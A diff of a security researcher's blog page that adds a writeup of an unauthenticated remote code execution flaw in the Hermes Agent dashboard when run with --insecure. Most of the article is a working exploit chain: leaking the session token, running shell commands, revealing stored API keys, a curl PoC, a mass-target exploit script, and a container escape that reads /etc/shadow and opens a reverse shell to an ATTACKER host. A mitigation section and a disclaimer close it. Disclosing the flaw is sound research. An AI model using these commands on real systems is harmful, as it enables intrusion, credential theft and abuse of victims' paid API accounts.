@@ -2,31 +2,219 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hermes Agent: Unauthenticated RCE and Credential Theft | X3r0Day</title>
-    <meta name="description" content="How an exposed Hermes Agent dashboard session token leads to unauthenticated code execution and credential theft.">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#1c1d20">
+    <title>Hermes Agent: unauthenticated RCE | X3r0Day</title>
+    <meta name="description" content="An exposed session token in Hermes Agent turns a dashboard visit into unauthenticated code execution and credential access.">
+    <meta name="author" content="X3r0Day">
+    <meta property="og:title" content="Hermes Agent: unauthenticated RCE">
+    <meta property="og:description" content="An exposed session token in Hermes Agent turns a dashboard visit into unauthenticated code execution and credential access.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://x3r0day.me/blog/hermes-agent-unauth-rce/">
     <link rel="canonical" href="https://x3r0day.me/blog/hermes-agent-unauth-rce/">
-    <link rel="stylesheet" href="/style.css">
-    <link rel="stylesheet" href="/blog/blog.css">
-    <script defer src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
+    <link rel="preload" href="/assets/fonts/fragment-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="preload" href="/assets/fonts/silkscreen-400-latin.woff2" as="font" type="font/woff2" crossorigin>
+    <link rel="stylesheet" href="/style.css?v=b345641a10a2">
+    <link rel="stylesheet" href="/blog/blog.css?v=e6cf661b0258">
+    <script defer src="/script.js?v=31e9c72a52f7"></script>
     <script defer src="/blog/blog.js"></script>
 </head>
-<body class="blog-page">
-    <main class="window outset blog-window">
-        <div class="title-bar">
-            <div class="title-text"><span aria-hidden="true">📝</span> Hermes Agent Unauth RCE.md - Notepad</div>
-        </div>
-        <nav class="menu-bar" aria-label="Site navigation">
-            <a href="/blog/">All posts</a>
-            <a href="/">Home</a>
-        </nav>
-        <article class="inset" id="notepad-content" aria-live="polite" aria-busy="true">
-            <p>Loading post...</p>
-            <noscript><p>Enable JavaScript to view the formatted post, or read the Markdown file below.</p></noscript>
-        </article>
-        <footer class="menu-bar">
-            <a id="post-source" href="/blog/writeups/Hermes%20Agent%20Unauth%20RCE.md">Read Markdown</a>
-        </footer>
-    </main>
+<body class="reading-page">
+<a class="skip-link" href="#main">Skip to content</a>
+<header class="site-header"><div class="header-inner wrap">
+    <a class="brand" href="/" aria-label="X3r0Day home">X3r0Day<span class="brand-suffix">Research &amp; notes</span></a>
+    <nav class="site-nav" id="site-nav" aria-label="Main navigation">
+        <a href="/">Research</a>
+        <a href="/blog/" aria-current="page">Writeups</a>
+        <a href="/#tools">Projects</a><a href="/#about">About</a>
+    </nav>
+    <div class="header-actions"><button class="search-trigger" type="button" aria-label="Search research" aria-controls="site-search" hidden><svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m16 16 5 5"/></svg></button><button class="menu-toggle" aria-controls="site-nav" aria-expanded="false" hidden>Menu <span aria-hidden="true">+</span></button></div>
+</div></header>
+<div class="reading-progress" aria-hidden="true"></div>
+<main id="main" class="article-page wrap">
+    <header class="article-header"><a class="back-link" href="/blog/"><span aria-hidden="true">←</span> All writing</a><div class="article-meta"><span class="topic-tag peach">Application security</span><span>Research note</span><span>6 min read</span></div><h1>Hermes Agent: unauthenticated RCE</h1><p class="article-dek">An exposed session token in Hermes Agent turns a dashboard visit into unauthenticated code execution and credential access.</p><div class="article-byline"><span class="author-mark" aria-hidden="true">x3</span><span>Words &amp; research by <strong>X3r0Day</strong></span><a class="source-link" href="/blog/writeups/Hermes%20Agent%20Unauth%20RCE.md">View Markdown ↗</a></div></header>
+    <div class="article-resources"><a href="https://github.com/X3r0Day/Unauthenticated-Hermes-RCE">Proof of concept ↗</a></div>
+    <div class="article-layout"><aside class="article-sidebar"><details class="toc" open><summary>In this article <span aria-hidden="true">⌄</span></summary><nav aria-label="Table of contents"><a href="#is-your-instance-vulnerable">Is your instance vulnerable?</a><a href="#why-it-happens">Why it happens</a><a href="#exploit-chain">Exploit Chain</a><a href="#what-you-actually-get-out">What you actually get out</a><a href="#going-further-container-escape">Going further: container escape</a><a href="#full-curl-poc">Full curl PoC</a><a href="#exploit-script">Exploit script</a><a href="#impact">Impact</a><a href="#how-to-protect-yourself">How to protect yourself</a><a href="#references">References</a><a href="#disclaimer">Disclaimer</a></nav></details></aside><article class="prose" id="post-content"><p>I was poking at NousResearch&#39;s <code>hermes-agent</code> and found that any instance running with the <code>--insecure</code> flag is fully owned over the network. No login, no CSRF token, no nothing. Just a session token sitting in plain HTML that the server happily accepts from any origin.</p>
+<p>The end result is shell on the box (as root, if the operator was generous) and every API key in the environment dumped in plaintext. The default port is <code>9119</code> btw (in case you wanna know iykyk ;)).</p>
+<h2 id="is-your-instance-vulnerable">Is your instance vulnerable?</h2>
+<p>Only if you started it with <code>--insecure</code>.</p>
+<p>That flag turns off the dashboard&#39;s auth gate. Once it&#39;s off, any request carrying the session token from the page HTML gets accepted, from any origin.</p>
+<p>The fun part: the original Docker entrypoint silently appended <code>--insecure</code> whenever the bind host was not <code>127.0.0.1</code> or <code>localhost</code>. So every Docker deployment binding to <code>0.0.0.0</code> got the flag without the operator ever typing it.</p>
+<p>They later changed it so you have to pass the flag explicitly. But every operator who binds to <code>0.0.0.0</code> still passes it, because the dashboard just refuses to start otherwise. So in practice it didn&#39;t really fix much (afaik).</p>
+<h2 id="why-it-happens">Why it happens</h2>
+<p>The dashboard ships with a JavaScript client that needs to talk to the backend API. To do that, the server bakes a session token directly into the HTML it serves:</p>
+<pre><code class="language-html">&lt;script&gt;
+  window.__HERMES_SESSION_TOKEN__ = &quot;abc123...&quot;;
+&lt;/script&gt;
+</code></pre>
+<p>The client reads that variable and uses it as a bearer token for every subsequent API call. That&#39;s fine when the server is behind real auth, because you&#39;d never get to load the page in the first place without proving who you are.</p>
+<p>With <code>--insecure</code>, there&#39;s no auth in front of the page. So anyone who can reach port <code>9119</code> can just <code>curl /</code> and read the token straight out of the response body. The backend then accepts that token on every protected endpoint, including the ones that run shell commands and reveal environment variables.</p>
+<p>There&#39;s no origin check, no CSRF protection, no token binding to anything. The token is the auth.</p>
+<h2 id="exploit-chain">Exploit Chain</h2>
+<h3 id="step-1-leak-the-session-token">Step 1: leak the session token</h3>
+<p>Just hit the root path:</p>
+<pre><code>GET / HTTP/1.1
+Host: target:9119
+</code></pre>
+<p>The token is right there in the HTML. Pull it out with grep:</p>
+<pre><code class="language-bash">curl -s http://TARGET:9119/ | grep -oP &#39;__HERMES_SESSION_TOKEN__\s*=\s*&quot;\K[^&quot;]+&#39;
+</code></pre>
+<p>If <code>/</code> returns something weird (non-200), fall back to <code>/env</code>. Any SPA route that returns the index HTML works, because the token is baked into the bundle.</p>
+<p>Regex used by the exploit script:</p>
+<pre><code class="language-text">__HERMES_SESSION_TOKEN__\s*=\s*&quot;([^&quot;]+)&quot;
+</code></pre>
+<h3 id="step-2-run-shell-commands">Step 2: run shell commands</h3>
+<p>Once you have the token, the console exec endpoint will run anything you send it:</p>
+<pre><code>POST /api/plugins/hermes-internal/console/exec HTTP/1.1
+Host: target:9119
+Authorization: Bearer &lt;token&gt;
+Content-Type: application/json
+
+{&quot;command&quot;: &quot;id; uname -a; hostname&quot;}
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-json">{
+  &quot;stdout&quot;: &quot;uid=10000(hermes) gid=10000(hermes) groups=10000(hermes)\nLinux ...\nhostname\n&quot;,
+  &quot;stderr&quot;: &quot;&quot;,
+  &quot;exit_code&quot;: 0
+}
+</code></pre>
+<p>Commands run through <code>child_process.exec</code> inside the container. The process is <code>uid 10000</code> (<code>hermes</code>) by default, but some operators run the container as <code>root</code> because the setup wizard literally asks them if they want to.</p>
+<h3 id="step-3-enumerate-environment-variables">Step 3: enumerate environment variables</h3>
+<pre><code>GET /api/env HTTP/1.1
+Host: target:9119
+Authorization: Bearer &lt;token&gt;
+</code></pre>
+<p>This returns a JSON object listing every env var name that&#39;s set. It&#39;s basically a directory of secrets, with the values masked out. That&#39;s fine, the next endpoint will unmask them for you.</p>
+<h3 id="step-4-reveal-the-secret-values">Step 4: reveal the secret values</h3>
+<pre><code>POST /api/env/reveal HTTP/1.1
+Host: target:9119
+Authorization: Bearer &lt;token&gt;
+Content-Type: application/json
+
+{&quot;key&quot;: &quot;ANTHROPIC_API_KEY&quot;}
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-json">{
+  &quot;key&quot;: &quot;ANTHROPIC_API_KEY&quot;,
+  &quot;value&quot;: &quot;sk-ant-api03-...&quot;
+}
+</code></pre>
+<p>This endpoint exists so the dashboard UI can show masked env vars when the operator clicks the little eye icon. Nice feature for the UI, terrible feature for anyone with the leaked token.</p>
+<p>Just iterate through every key from step 3 and you walk away with every secret on the box.</p>
+<h2 id="what-you-actually-get-out">What you actually get out</h2>
+<p>Hermes is an AI agent dashboard, so the env is basically a wallet of expensive API keys. Here&#39;s what&#39;s typically sitting in there:</p>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>what it unlocks</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ANTHROPIC_API_KEY</code></td>
+<td>Claude API</td>
+</tr>
+<tr>
+<td><code>OPENAI_API_KEY</code></td>
+<td>GPT API</td>
+</tr>
+<tr>
+<td><code>DEEPSEEK_API_KEY</code></td>
+<td>DeepSeek API</td>
+</tr>
+<tr>
+<td><code>GOOGLE_API_KEY</code></td>
+<td>Google Cloud / Gemini</td>
+</tr>
+<tr>
+<td><code>OPENROUTER_API_KEY</code></td>
+<td>multi-model API gateway</td>
+</tr>
+<tr>
+<td><code>GITHUB_TOKEN</code></td>
+<td>GitHub personal access token</td>
+</tr>
+<tr>
+<td><code>DISCORD_BOT_TOKEN</code></td>
+<td>Discord bot</td>
+</tr>
+<tr>
+<td><code>SLACK_BOT_TOKEN</code></td>
+<td>Slack workspace</td>
+</tr>
+<tr>
+<td><code>TELEGRAM_BOT_TOKEN</code></td>
+<td>Telegram bot</td>
+</tr>
+</tbody></table>
+<p>Any one of these alone is a bad day. All of them at once is a very bad day. The GitHub token in particular can pivot into the operator&#39;s source code, CI secrets, and from there their whole infra.</p>
+<h2 id="going-further-container-escape">Going further: container escape</h2>
+<p>Once you have shell inside the container, check if the operator was kind enough to mount the docker socket:</p>
+<pre><code class="language-bash">ls -l /var/run/docker.sock
+</code></pre>
+<p>If that returns a socket, the host&#39;s docker daemon is reachable from inside the container. Game over for the host. Just spawn a privileged container that mounts the host root and chroot into it:</p>
+<pre><code class="language-bash">docker run --rm -v /:/host alpine sh -c &#39;chroot /host id; chroot /host cat /etc/shadow&#39;
+</code></pre>
+<p>Or skip the messing around and grab a reverse shell on the host directly:</p>
+<pre><code class="language-bash">docker run --rm -v /:/host alpine chroot /host \
+  /bin/sh -c &#39;bash -i &gt;&amp; /dev/tcp/ATTACKER/4444 0&gt;&amp;1&#39;
+</code></pre>
+<p>That breaks out of the hermes container entirely and gives you root on the bare metal.</p>
+<p>Even if the docker socket isn&#39;t mounted, the in-container shell is enough to dump secrets, pivot to other internal services the container can reach, and use the box as a relay.</p>
+<h2 id="full-curl-poc">Full curl PoC</h2>
+<p>This is the end-to-end exploit in seven lines of bash:</p>
+<pre><code class="language-bash">HOST=&quot;TARGET&quot;
+PORT=&quot;9119&quot;
+
+TOKEN=$(curl -s &quot;http://${HOST}:${PORT}/&quot; | grep -oP &#39;__HERMES_SESSION_TOKEN__\s*=\s*&quot;\K[^&quot;]+&#39;)
+
+curl -s -X POST &quot;http://${HOST}:${PORT}/api/plugins/hermes-internal/console/exec&quot; \
+     -H &quot;Authorization: Bearer ${TOKEN}&quot; \
+     -H &quot;Content-Type: application/json&quot; \
+     -d &#39;{&quot;command&quot;:&quot;id; uname -a&quot;}&#39;
+
+curl -s -X POST &quot;http://${HOST}:${PORT}/api/env/reveal&quot; \
+     -H &quot;Authorization: Bearer ${TOKEN}&quot; \
+     -H &quot;Content-Type: application/json&quot; \
+     -d &#39;{&quot;key&quot;:&quot;ANTHROPIC_API_KEY&quot;}&#39;
+</code></pre>
+<h2 id="exploit-script">Exploit script</h2>
+<p>I wrote a small Python script (<code>exploit.py</code>) that automates the whole chain. Usage:</p>
+<pre><code class="language-bash">python3 exploit.py -u TARGET                 # just leak token + sanity check
+python3 exploit.py -u TARGET -c &#39;id&#39;         # run one command
+python3 exploit.py -u TARGET -s              # interactive shell
+python3 exploit.py -u TARGET -d              # dump every env var
+python3 exploit.py -l targets.txt -d         # do the dump across a target list
+</code></pre>
+<p>The repo with the full script lives at <a href="https://github.com/X3r0Day/Unauthenticated-Hermes-RCE">github.com/X3r0Day/Unauthenticated-Hermes-RCE</a>.</p>
+<h2 id="impact">Impact</h2>
+<p>Pre-auth RCE plus full secret disclosure on a service that, by design, is full of expensive API keys and access tokens. No interaction needed. No prior access needed. One HTTP GET and you have the token, two more POSTs and you have shell and every key on the box.</p>
+<p>If the operator runs the container as <code>root</code>, you have root in the container. If they also mounted the docker socket, you have root on the host. If the host has access to internal infra, you have a pivot.</p>
+<p>And because the keys you steal are mostly LLM API keys with billing attached, you can also just burn money on the victim&#39;s tab. Which makes it even more terrifying </p>
+<h2 id="how-to-protect-yourself">How to protect yourself</h2>
+<p>If you&#39;re running hermes-agent:</p>
+<ul>
+<li>Don&#39;t pass <code>--insecure</code>. If the dashboard refuses to start without it on <code>0.0.0.0</code>, then don&#39;t bind it to <code>0.0.0.0</code>. Put it behind a reverse proxy that handles auth, or bind it to loopback and tunnel in over SSH.</li>
+<li>Don&#39;t run the container as <code>root</code> just because the setup wizard offered it.</li>
+<li>Don&#39;t mount <code>/var/run/docker.sock</code> into the container unless you genuinely need it. You almost never do.</li>
+<li>Treat the env file like it&#39;s a password file, because it is.</li>
+<li>Rotate any API key that was ever loaded into a hermes instance reachable from the internet. Assume it&#39;s been pulled.</li>
+</ul>
+<p>If you&#39;re shipping a self-hosted dashboard that needs an auth token in the page bundle, please don&#39;t pretend that token is auth. Put a real auth gate in front of the page itself, so an unauthenticated attacker can&#39;t fetch the HTML and read the token in the first place.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/NousResearch/hermes-agent">github.com/NousResearch/hermes-agent</a> (the affected project)</li>
+<li><a href="https://github.com/X3r0Day/Unauthenticated-Hermes-RCE">github.com/X3r0Day/Unauthenticated-Hermes-RCE</a> (PoC repo and Python exploit)</li>
+</ul>
+<h2 id="disclaimer">Disclaimer</h2>
+<p>This writeup is for security research and authorized testing. Don&#39;t point the exploit script at boxes you don&#39;t own or don&#39;t have permission to test.</p>
+</article></div>
+    <div class="article-end"><span>Thanks for reading.</span><a class="text-link" href="/blog/">Back to all writing <span aria-hidden="true">↗</span></a></div>
+    <a class="next-post sage" href="/blog/bun-file-traversal/"><div><span>Keep reading</span><h2>Bun install: arbitrary file write</h2></div><span aria-hidden="true">↗</span></a>
+</main>
+<footer class="site-footer wrap"><a class="footer-name" href="/">X3r0Day<span> / independent research</span></a><div><a href="https://github.com/X3r0Day">GitHub ↗</a><a href="https://x.com/X3r0DaySec">X / Twitter ↗</a><a href="mailto:cr4n@duck.com">Email ↗</a></div><span>© 2026</span></footer>
+<dialog id="site-search" class="search-dialog" aria-labelledby="search-title"><div class="search-dialog-heading"><h2 id="search-title">Search the index.</h2><button type="button" class="search-close" aria-label="Close search">×</button></div><label class="sr-only" for="site-query">Search research and projects</label><input id="site-query" type="search" placeholder="A finding, a tool, a question…" autocomplete="off" autofocus><p class="search-status" role="status"></p><ul class="search-results"><li data-search="emacs: code execution on file open an ordinary file. an unexpected execution path. how emacs directory locals bypassed the very check meant to keep them safe. editor security"><a href="/blog/emacs-dir-locals-code-execution/"><span>Editor security</span><strong>Emacs: code execution on file open</strong><span aria-hidden="true">↗</span></a></li><li data-search="hermes agent: unauthenticated rce an exposed session token in hermes agent turns a dashboard visit into unauthenticated code execution and credential access. application security"><a href="/blog/hermes-agent-unauth-rce/"><span>Application security</span><strong>Hermes Agent: unauthenticated RCE</strong><span aria-hidden="true">↗</span></a></li><li data-search="bun install: arbitrary file write a dependency alias takes bun outside node_modules. arbitrary file writes, even with lifecycle scripts disabled. supply chain"><a href="/blog/bun-file-traversal/"><span>Supply chain</span><strong>Bun install: arbitrary file write</strong><span aria-hidden="true">↗</span></a></li><li data-search="git fsmonitor: workspace poisoning when git-aware editors trust a poisoned workspace, a routine status check can become local code execution. developer tooling"><a href="/blog/fsmonitor-lrce/"><span>Developer tooling</span><strong>Git FSMonitor: workspace poisoning</strong><span aria-hidden="true">↗</span></a></li><li data-search="insect v2 an earlier red-team project revisiting 1990s malware, preserved from the original research collection. red-team research"><a href="https://github.com/X3r0Day/FUD-C2-Framework.git"><span>Red-team research</span><strong>Insect V2</strong><span aria-hidden="true">↗</span></a></li><li data-search="workspace trust &amp; python .pth files the research collection covering vs code python initialization and git fsmonitor workspace poisoning. developer tooling"><a href="https://github.com/X3r0Day/X3r0Day-Research"><span>Developer tooling</span><strong>Workspace trust &amp; Python .pth files</strong><span aria-hidden="true">↗</span></a></li><li data-search="a data-exposure disclosure to cert-in a coordinated report concerning exposed personal data on an indian government website. responsible disclosure"><a href="https://x.com/X3r0DaySec/status/2063002547561115826"><span>Responsible disclosure</span><strong>A data-exposure disclosure to CERT-In</strong><span aria-hidden="true">↗</span></a></li></ul><p class="search-empty" hidden>No matches. Try a different word.</p><div class="search-dialog-foot"><span>Research, not a search engine.</span><span>Esc to close</span></div></dialog>
 </body>
 </html>
